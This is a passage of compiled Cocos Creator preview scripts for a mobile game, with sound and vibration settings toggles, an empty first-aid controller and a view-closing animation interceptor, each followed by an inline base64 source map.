Vzb2x2ZSgpO1xyXG4gICAgICAgIH0pO1xyXG4gICAgfVxyXG5cclxuXHJcbiAgICAvKiog5omT5byA56qX5Y+j55qE54m55pWIICovXHJcblxyXG4gICAgLyoqIOS7juWxj+W5leS4i+aWueW8ueWHuiAqL1xyXG4gICAgYXN5bmMgbW92ZURvd25Ub0ZvY3VzKG5vZGU6Y2MuTm9kZSl7XHJcbiAgICAgICAgbGV0IHggPSBub2RlLng7XHJcbiAgICAgICAgbGV0IHkgPSBub2RlLnk7XHJcbiAgICAgICAgbm9kZS55ID0geSAtIGNjLnZpZXcuZ2V0VmlzaWJsZVNpemUoKS5oZWlnaHQ7XHJcbiAgICAgICAgYXdhaXQgbm9kZS5ydW5BY3Rpb25Bd2FpdChjYy5tb3ZlVG8oMS4yLCB4LCB5KS5lYXNpbmcoY2MuZWFzZUVsYXN0aWNPdXQoMC42KSkpO1xyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/SettingsController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '70d0e19OftKZJUlHUMeABhq', 'SettingsController');
// script/app/home/SettingsController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var Music_1 = require("../../../framework/audio/Music");
var World_1 = require("../info/World");
var View_1 = require("../../../framework/component/View");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var SettingsController = /** @class */ (function (_super) {
    __extends(SettingsController, _super);
    function SettingsController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.soundToggle = null;
        _this.shakeToggle = null;
        return _this;
    }
    // LIFE-CYCLE CALLBACKS:
    SettingsController.prototype.onLoad = function () {
        this.soundToggle.isChecked = Music_1.Music.getMusicOpen();
        this.shakeToggle.isChecked = World_1.World.Storage.shakeOpen;
        var sfxCheckEventHandler = new cc.Component.EventHandler();
        sfxCheckEventHandler.target = this.node; //这个 node 节点是你的事件处理代码组件所属的节点
        sfxCheckEventHandler.component = "SettingsController";
        sfxCheckEventHandler.handler = "sfxToggleCallback";
        sfxCheckEventHandler.customEventData = "";
        this.soundToggle.checkEvents.push(sfxCheckEventHandler);
        var shakeCheckEventHandler = new cc.Component.EventHandler();
        shakeCheckEventHandler.target = this.node; //这个 node 节点是你的事件处理代码组件所属的节点
        shakeCheckEventHandler.component = "SettingsController";
        shakeCheckEventHandler.handler = "shakeToggleCallback";
        shakeCheckEventHandler.customEventData = "";
        this.shakeToggle.checkEvents.push(shakeCheckEventHandler);
    };
    SettingsController.prototype.sfxToggleCallback = function (event, data) {
        if (this.soundToggle.isChecked != Music_1.Music.getMusicOpen()) {
            View_1.default.executeClickSoundCommand(event, data);
            Music_1.Music.setMusicOpen(!Music_1.Music.getMusicOpen());
            Music_1.Music.sfxOpen = Music_1.Music.getMusicOpen();
            Music_1.Music.persistence();
            // Facade.canvasNode.emit("SwitchMusic", Music.getMusicOpen());
        }
    };
    SettingsController.prototype.shakeToggleCallback = function (event, data) {
        if (this.shakeToggle.isChecked != World_1.World.Storage.shakeOpen) {
            View_1.default.executeClickSoundCommand(event, data);
            World_1.World.Storage.shakeOpen = !World_1.World.Storage.shakeOpen;
        }
    };
    __decorate([
        property(cc.Toggle)
    ], SettingsController.prototype, "soundToggle", void 0);
    __decorate([
        property(cc.Toggle)
    ], SettingsController.prototype, "shakeToggle", void 0);
    SettingsController = __decorate([
        ccclass
    ], SettingsController);
    return SettingsController;
}(cc.Component));
exports.default = SettingsController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvU2V0dGluZ3NDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSx3REFBcUQ7QUFDckQsdUNBQW9DO0FBQ3BDLDBEQUFxRDtBQUcvQyxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFnRCxzQ0FBWTtJQUE1RDtRQUFBLHFFQStDQztRQTVDRyxpQkFBVyxHQUFhLElBQUksQ0FBQztRQUc3QixpQkFBVyxHQUFhLElBQUksQ0FBQzs7SUF5Q2pDLENBQUM7SUF2Q0csd0JBQXdCO0lBRXhCLG1DQUFNLEdBQU47UUFDSSxJQUFJLENBQUMsV0FBVyxDQUFDLFNBQVMsR0FBRyxhQUFLLENBQUMsWUFBWSxFQUFFLENBQUM7UUFDbEQsSUFBSSxDQUFDLFdBQVcsQ0FBQyxTQUFTLEdBQUcsYUFBSyxDQUFDLE9BQU8sQ0FBQyxTQUFTLENBQUM7UUFDckQsSUFBSSxvQkFBb0IsR0FBRyxJQUFJLEVBQUUsQ0FBQyxTQUFTLENBQUMsWUFBWSxFQUFFLENBQUM7UUFDM0Qsb0JBQW9CLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQyw0QkFBNEI7UUFDckUsb0JBQW9CLENBQUMsU0FBUyxHQUFHLG9CQUFvQixDQUFDO1FBQ3RELG9CQUFvQixDQUFDLE9BQU8sR0FBRyxtQkFBbUIsQ0FBQztRQUNuRCxvQkFBb0IsQ0FBQyxlQUFlLEdBQUcsRUFBRSxDQUFDO1FBRTFDLElBQUksQ0FBQyxXQUFXLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxvQkFBb0IsQ0FBQyxDQUFDO1FBR3hELElBQUksc0JBQXNCLEdBQUcsSUFBSSxFQUFFLENBQUMsU0FBUyxDQUFDLFlBQVksRUFBRSxDQUFDO1FBQzdELHNCQUFzQixDQUFDLE1BQU0sR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUMsNEJBQTRCO1FBQ3ZFLHNCQUFzQixDQUFDLFNBQVMsR0FBRyxvQkFBb0IsQ0FBQztRQUN4RCxzQkFBc0IsQ0FBQyxPQUFPLEdBQUcscUJBQXFCLENBQUM7UUFDdkQsc0JBQXNCLENBQUMsZUFBZSxHQUFHLEVBQUUsQ0FBQztRQUU1QyxJQUFJLENBQUMsV0FBVyxDQUFDLFdBQVcsQ0FBQyxJQUFJLENBQUMsc0JBQXNCLENBQUMsQ0FBQztJQUM5RCxDQUFDO0lBRUQsOENBQWlCLEdBQWpCLFVBQWtCLEtBQUssRUFBRSxJQUFJO1FBQ3pCLElBQUksSUFBSSxDQUFDLFdBQVcsQ0FBQyxTQUFTLElBQUksYUFBSyxDQUFDLFlBQVksRUFBRSxFQUFDO1lBQ25ELGNBQUksQ0FBQyx3QkFBd0IsQ0FBQyxLQUFLLEVBQUUsSUFBSSxDQUFDLENBQUM7WUFDM0MsYUFBSyxDQUFDLFlBQVksQ0FBQyxDQUFDLGFBQUssQ0FBQyxZQUFZLEVBQUUsQ0FBQyxDQUFDO1lBQzFDLGFBQUssQ0FBQyxPQUFPLEdBQUcsYUFBSyxDQUFDLFlBQVksRUFBRSxDQUFDO1lBQ3JDLGFBQUssQ0FBQyxXQUFXLEVBQUUsQ0FBQztZQUNwQiwrREFBK0Q7U0FDbEU7SUFDTCxDQUFDO0lBRUQsZ0RBQW1CLEdBQW5CLFVBQW9CLEtBQUssRUFBRSxJQUFJO1FBQzNCLElBQUksSUFBSSxDQUFDLFdBQVcsQ0FBQyxTQUFTLElBQUksYUFBSyxDQUFDLE9BQU8sQ0FBQyxTQUFTLEVBQUM7WUFDdEQsY0FBSSxDQUFDLHdCQUF3QixDQUFDLEtBQUssRUFBRSxJQUFJLENBQUMsQ0FBQztZQUMzQyxhQUFLLENBQUMsT0FBTyxDQUFDLFNBQVMsR0FBRyxDQUFDLGFBQUssQ0FBQyxPQUFPLENBQUMsU0FBUyxDQUFDO1NBQ3REO0lBQ0wsQ0FBQztJQTNDRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDOzJEQUNTO0lBRzdCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7MkRBQ1M7SUFOWixrQkFBa0I7UUFEdEMsT0FBTztPQUNhLGtCQUFrQixDQStDdEM7SUFBRCx5QkFBQztDQS9DRCxBQStDQyxDQS9DK0MsRUFBRSxDQUFDLFNBQVMsR0ErQzNEO2tCQS9Db0Isa0JBQWtCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCB7TXVzaWN9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvYXVkaW8vTXVzaWNcIjtcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uL2luZm8vV29ybGRcIjtcclxuaW1wb3J0IFZpZXcgZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9jb21wb25lbnQvVmlld1wiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBTZXR0aW5nc0NvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ub2dnbGUpXHJcbiAgICBzb3VuZFRvZ2dsZTpjYy5Ub2dnbGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ub2dnbGUpXHJcbiAgICBzaGFrZVRvZ2dsZTpjYy5Ub2dnbGUgPSBudWxsO1xyXG5cclxuICAgIC8vIExJRkUtQ1lDTEUgQ0FMTEJBQ0tTOlxyXG5cclxuICAgIG9uTG9hZCAoKSB7XHJcbiAgICAgICAgdGhpcy5zb3VuZFRvZ2dsZS5pc0NoZWNrZWQgPSBNdXNpYy5nZXRNdXNpY09wZW4oKTtcclxuICAgICAgICB0aGlzLnNoYWtlVG9nZ2xlLmlzQ2hlY2tlZCA9IFdvcmxkLlN0b3JhZ2Uuc2hha2VPcGVuO1xyXG4gICAgICAgIGxldCBzZnhDaGVja0V2ZW50SGFuZGxlciA9IG5ldyBjYy5Db21wb25lbnQuRXZlbnRIYW5kbGVyKCk7XHJcbiAgICAgICAgc2Z4Q2hlY2tFdmVudEhhbmRsZXIudGFyZ2V0ID0gdGhpcy5ub2RlOyAvL+i/meS4qiBub2RlIOiKgueCueaYr+S9oOeahOS6i+S7tuWkhOeQhuS7o+eggee7hOS7tuaJgOWxnueahOiKgueCuVxyXG4gICAgICAgIHNmeENoZWNrRXZlbnRIYW5kbGVyLmNvbXBvbmVudCA9IFwiU2V0dGluZ3NDb250cm9sbGVyXCI7XHJcbiAgICAgICAgc2Z4Q2hlY2tFdmVudEhhbmRsZXIuaGFuZGxlciA9IFwic2Z4VG9nZ2xlQ2FsbGJhY2tcIjtcclxuICAgICAgICBzZnhDaGVja0V2ZW50SGFuZGxlci5jdXN0b21FdmVudERhdGEgPSBcIlwiO1xyXG5cclxuICAgICAgICB0aGlzLnNvdW5kVG9nZ2xlLmNoZWNrRXZlbnRzLnB1c2goc2Z4Q2hlY2tFdmVudEhhbmRsZXIpO1xyXG5cclxuXHJcbiAgICAgICAgbGV0IHNoYWtlQ2hlY2tFdmVudEhhbmRsZXIgPSBuZXcgY2MuQ29tcG9uZW50LkV2ZW50SGFuZGxlcigpO1xyXG4gICAgICAgIHNoYWtlQ2hlY2tFdmVudEhhbmRsZXIudGFyZ2V0ID0gdGhpcy5ub2RlOyAvL+i/meS4qiBub2RlIOiKgueCueaYr+S9oOeahOS6i+S7tuWkhOeQhuS7o+eggee7hOS7tuaJgOWxnueahOiKgueCuVxyXG4gICAgICAgIHNoYWtlQ2hlY2tFdmVudEhhbmRsZXIuY29tcG9uZW50ID0gXCJTZXR0aW5nc0NvbnRyb2xsZXJcIjtcclxuICAgICAgICBzaGFrZUNoZWNrRXZlbnRIYW5kbGVyLmhhbmRsZXIgPSBcInNoYWtlVG9nZ2xlQ2FsbGJhY2tcIjtcclxuICAgICAgICBzaGFrZUNoZWNrRXZlbnRIYW5kbGVyLmN1c3RvbUV2ZW50RGF0YSA9IFwiXCI7XHJcblxyXG4gICAgICAgIHRoaXMuc2hha2VUb2dnbGUuY2hlY2tFdmVudHMucHVzaChzaGFrZUNoZWNrRXZlbnRIYW5kbGVyKTtcclxuICAgIH1cclxuXHJcbiAgICBzZnhUb2dnbGVDYWxsYmFjayhldmVudCwgZGF0YSl7XHJcbiAgICAgICAgaWYgKHRoaXMuc291bmRUb2dnbGUuaXNDaGVja2VkICE9IE11c2ljLmdldE11c2ljT3BlbigpKXtcclxuICAgICAgICAgICAgVmlldy5leGVjdXRlQ2xpY2tTb3VuZENvbW1hbmQoZXZlbnQsIGRhdGEpO1xyXG4gICAgICAgICAgICBNdXNpYy5zZXRNdXNpY09wZW4oIU11c2ljLmdldE11c2ljT3BlbigpKTtcclxuICAgICAgICAgICAgTXVzaWMuc2Z4T3BlbiA9IE11c2ljLmdldE11c2ljT3BlbigpO1xyXG4gICAgICAgICAgICBNdXNpYy5wZXJzaXN0ZW5jZSgpO1xyXG4gICAgICAgICAgICAvLyBGYWNhZGUuY2FudmFzTm9kZS5lbWl0KFwiU3dpdGNoTXVzaWNcIiwgTXVzaWMuZ2V0TXVzaWNPcGVuKCkpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBzaGFrZVRvZ2dsZUNhbGxiYWNrKGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBpZiAodGhpcy5zaGFrZVRvZ2dsZS5pc0NoZWNrZWQgIT0gV29ybGQuU3RvcmFnZS5zaGFrZU9wZW4pe1xyXG4gICAgICAgICAgICBWaWV3LmV4ZWN1dGVDbGlja1NvdW5kQ29tbWFuZChldmVudCwgZGF0YSk7XHJcbiAgICAgICAgICAgIFdvcmxkLlN0b3JhZ2Uuc2hha2VPcGVuID0gIVdvcmxkLlN0b3JhZ2Uuc2hha2VPcGVuO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/game/FirstAidController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '4257bH2VnpGgpQA0t4A+GQi', 'FirstAidController');
// script/app/game/FirstAidController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var FirstAidController = /** @class */ (function (_super) {
    __extends(FirstAidController, _super);
    function FirstAidController() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    FirstAidController = __decorate([
        ccclass
    ], FirstAidController);
    return FirstAidController;
}(cc.Component));
exports.default = FirstAidController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2dhbWUvRmlyc3RBaWRDb250cm9sbGVyLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDTSxJQUFBLEtBQXNCLEVBQUUsQ0FBQyxVQUFVLEVBQWxDLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBaUIsQ0FBQztBQUcxQztJQUFnRCxzQ0FBWTtJQUE1RDs7SUE0RkEsQ0FBQztJQTVGb0Isa0JBQWtCO1FBRHRDLE9BQU87T0FDYSxrQkFBa0IsQ0E0RnRDO0lBQUQseUJBQUM7Q0E1RkQsQUE0RkMsQ0E1RitDLEVBQUUsQ0FBQyxTQUFTLEdBNEYzRDtrQkE1Rm9CLGtCQUFrQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEZpcnN0QWlkQ29udHJvbGxlciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgLypAcHJvcGVydHkoY2MuU3ByaXRlRnJhbWUpXHJcbiAgICBndW5TcHJpdGVGcmFtZXM6W2NjLlNwcml0ZUZyYW1lXSA9IFtdO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5TcHJpdGUpXHJcbiAgICBndW5TcHJpdGU6Y2MuU3ByaXRlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICBidWxsZXRMYWJlbDpjYy5MYWJlbCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlByb2dyZXNzQmFyKVxyXG4gICAgcHJvZ3Jlc3NCYXI6Y2MuUHJvZ3Jlc3NCYXIgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5CdXR0b24pXHJcbiAgICBidXR0b246Y2MuQnV0dG9uID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoQmFubmVyQ29tcG9uZW50KVxyXG4gICAgYmFubmVyQ29tcDpCYW5uZXJDb21wb25lbnQgPSBudWxsO1xyXG5cclxuICAgIC8vIExJRkUtQ1lDTEUgQ0FMTEJBQ0tTOlxyXG5cclxuICAgIC8vIG9uTG9hZCAoKSB7fVxyXG4gICAgcHJpdmF0ZSBtYXhDbGljayA9IDc7XHJcblxyXG4gICAgcHJpdmF0ZSBjbGlja051bSA9IDA7XHJcblxyXG5cclxuICAgIHByaXZhdGUgX2N1clRpbWUgPSA4MDtcclxuXHJcbiAgICBnZXQgY3VyVGltZSgpOiBudW1iZXIge1xyXG4gICAgICAgIHJldHVybiB0aGlzLl9jdXJUaW1lO1xyXG4gICAgfVxyXG5cclxuICAgIHNldCBjdXJUaW1lKHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICBpZiAodmFsdWUgPj0gdGhpcy5tYXhUaW1lKXtcclxuICAgICAgICAgICAgdmFsdWUgPSB0aGlzLm1heFRpbWU7XHJcbiAgICAgICAgICAgIHRoaXMuc2hvd0Jhbm5lcigpO1xyXG4gICAgICAgIH1lbHNlIGlmICh2YWx1ZSA8IDApe1xyXG4gICAgICAgICAgICB2YWx1ZSA9IDA7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMuX2N1clRpbWUgPSB2YWx1ZTtcclxuICAgICAgICB0aGlzLnVwZGF0ZVByb2dyZXNzKCk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBtYXhUaW1lID0gMTAwO1xyXG5cclxuICAgIHByaXZhdGUgdXBkYXRlUHJvZ3Jlc3MoKXtcclxuICAgICAgICB0aGlzLnByb2dyZXNzQmFyLnByb2dyZXNzID0gdGhpcy5fY3VyVGltZSAvIHRoaXMubWF4VGltZTtcclxuICAgIH1cclxuXHJcbiAgICBvbkVuYWJsZSAoKSB7XHJcbiAgICAgICAgdGhpcy5iYW5uZXJDb21wLmVuYWJsZWQgPSBmYWxzZTtcclxuICAgICAgICBHYW1lUHJveHkucGF1c2VHYW1lID0gdHJ1ZTtcclxuICAgICAgICB0aGlzLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICBsZXQgd2VhcG9uQ29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uKS5maWx0ZXIodmFsdWUgPT4gdmFsdWVbJ2lkJ10gIT0gMSkuc29ydCgoKGEsIGIpID0+IGJbJ3VubG9jayddIC0gYVsndW5sb2NrJ10pKTtcclxuICAgICAgICBmb3IgKGxldCBpdGVtIG9mIHdlYXBvbkNvbmZpZyl7XHJcbiAgICAgICAgICAgIGlmIChHYW1lUHJveHkubGV2ZWwgPj0gaXRlbVsndW5sb2NrJ10pe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5ndW5TcHJpdGUuc3ByaXRlRnJhbWUgPSB0aGlzLmd1blNwcml0ZUZyYW1lc1tpdGVtWydpZCddIC0gMV07XHJcbiAgICAgICAgICAgICAgICB0aGlzLmJ1bGxldExhYmVsLnN0cmluZyA9IGDlrZDlvLkgJHtXb3JsZC5NeS5hcm1vcnkucGF5bG9hZEFkZE9mKGl0ZW1bJ2lkJ10pICogM314M2A7XHJcbiAgICAgICAgICAgICAgICBicmVhaztcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLnVwZGF0ZVByb2dyZXNzKCk7XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja0J1dHRvbihldmVudCwgZGF0YSl7XHJcbiAgICAgICAgaWYgKCF0aGlzLmJhbm5lckNvbXAuZW5hYmxlZCl7XHJcbiAgICAgICAgICAgIHRoaXMuY2xpY2tOdW0rKztcclxuICAgICAgICAgICAgdGhpcy5jdXJUaW1lICs9IDEwO1xyXG4gICAgICAgICAgICBpZiAodGhpcy5jbGlja051bSA9PSB0aGlzLm1heENsaWNrKXtcclxuICAgICAgICAgICAgICAgIHRoaXMuc2hvd0Jhbm5lcigpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICB0aGlzLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgIEdhbWVQcm94eS5wYXVzZUdhbWUgPSBmYWxzZTtcclxuICAgICAgICAgICAgR2FtZVByb3h5LmVtaXQoR2FtZVByb3h5LkV2ZW50LlJlbGl2ZUdhbWUpO1xyXG4gICAgICAgICAgICBHYW1lUHJveHkuZmlyc3RBaWRGbGFnID0gZmFsc2U7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHNob3dCYW5uZXIoKXtcclxuICAgICAgICB0aGlzLnByb2dyZXNzQmFyLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5idXR0b24ubm9kZS55ICs9IDI1MDtcclxuICAgICAgICB0aGlzLmJhbm5lckNvbXAuZW5hYmxlZCA9IHRydWU7XHJcbiAgICB9XHJcblxyXG4gICAgdXBkYXRlKGR0Om51bWJlcil7XHJcbiAgICAgICAgaWYgKHRoaXMucHJvZ3Jlc3NCYXIubm9kZS5hY3RpdmUpe1xyXG4gICAgICAgICAgICB0aGlzLmN1clRpbWUgLT0gMC4zO1xyXG4gICAgICAgIH1cclxuICAgIH0qL1xyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/interceptor/CloseViewInterceptor.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '70f4ci32X1CS5X5s4ooQJYZ', 'CloseViewInterceptor');
// script/app/interceptor/CloseViewInterceptor.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
Object.defineProperty(exports, "__esModule", { value: true });
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var CloseViewInterceptor = /** @class */ (function () {
    function CloseViewInterceptor() {
    }
    /**
     * 关闭view之前处理
     * */
    CloseViewInterceptor.prototype.preHandle = function () {
        var args = [];
        for (var _i = 0; _i < arguments.length; _i++) {
            args[_i] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            var _this = this;
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) { return __awaiter(_this, void 0, void 0, function () {
                        var str, node;
                        return __generator(this, function (_a) {
                            switch (_a.label) {
                                case 0:
                                    str = args[0];
                                    if (typeof str != "string") {
                                        str = str.name;
                                    }
                                    if (!(str == "task")) return [3 /*break*/, 2];
                                    node = typeof args[0] == "string" ? Facade_1.default.canvasNode.getChildByName(str) : args[0];
                                    return [4 /*yield*/, this.moveFocusToDown(node)];
                                case 1:
                                    _a.sent();
                                    _a.label = 2;
                                case 2:
                                    resolve(true);
                                    return [2 /*return*/];
                            }
                        });
                    }); })];
            });
        });
    };
    /**
     * 关闭view之后处理
     * */
    CloseViewInterceptor.prototype.postHandle = function (res) {
        var args = [];
        for (var _i = 1; _i < arguments.length; _i++) {
            args[_i - 1] = arguments[_i];
        }
        return __awaiter(this, void 0, Promise, function () {
            return __generator(this, function (_a) {
                return [2 /*return*/, new Promise(function (resolve, reject) {
                        var str = args[0];
                        if (typeof str != "string") {
                            str = str.name;
                        }
                        if (str == "task") {
                        }
                        resolve();
                    })];
            });
        });
    };
    /** 关闭窗口的特效 */
    /** 从下方移出 */
    CloseViewInterceptor.prototype.moveFocusToDown = function (node) {
        return __awaiter(this, void 0, void 0, function () {
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0: 
                    // await node.runActionAwait(cc.moveBy(1.5, 0, -cc.view.getVisibleSize().height).easing(cc.easeElasticIn(0.6)));
                    return [4 /*yield*/, node.runActionAwait(cc.moveBy(0.5, 0, -cc.view.getVisibleSize().height).easing(cc.easeBackIn()))];
                    case 1:
                        // await node.runActionAwait(cc.moveBy(1.5, 0, -cc.view.getVisibleSize().height).easing(cc.easeElasticIn(0.6)));
                        _a.sent();
                        return [2 /*return*/];
                }
            });
        });
    };
    CloseViewInterceptor = __decorate([
        ccclass
    ], CloseViewInterceptor);
    return CloseViewInterceptor;
}());
exports.default = CloseViewInterceptor;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2ludGVyY2VwdG9yL0Nsb3NlVmlld0ludGVyY2VwdG9yLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HOztBQUduRywyREFBc0Q7QUFFaEQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBQTtJQTBDQSxDQUFDO0lBeENHOztTQUVLO0lBQ0Msd0NBQVMsR0FBZjtRQUFnQixjQUFPO2FBQVAsVUFBTyxFQUFQLHFCQUFPLEVBQVAsSUFBTztZQUFQLHlCQUFPOzt1Q0FBRyxPQUFPOzs7Z0JBQzdCLHNCQUFPLElBQUksT0FBTyxDQUFVLFVBQU8sT0FBTyxFQUFFLE1BQU07Ozs7O29DQUMxQyxHQUFHLEdBQUcsSUFBSSxDQUFDLENBQUMsQ0FBQyxDQUFDO29DQUNsQixJQUFJLE9BQU8sR0FBRyxJQUFJLFFBQVEsRUFBRTt3Q0FDeEIsR0FBRyxHQUFHLEdBQUcsQ0FBQyxJQUFJLENBQUM7cUNBQ2xCO3lDQUNHLENBQUEsR0FBRyxJQUFJLE1BQU0sQ0FBQSxFQUFiLHdCQUFhO29DQUNULElBQUksR0FBRyxPQUFPLElBQUksQ0FBQyxDQUFDLENBQUMsSUFBSSxRQUFRLENBQUMsQ0FBQyxDQUFDLGdCQUFNLENBQUMsVUFBVSxD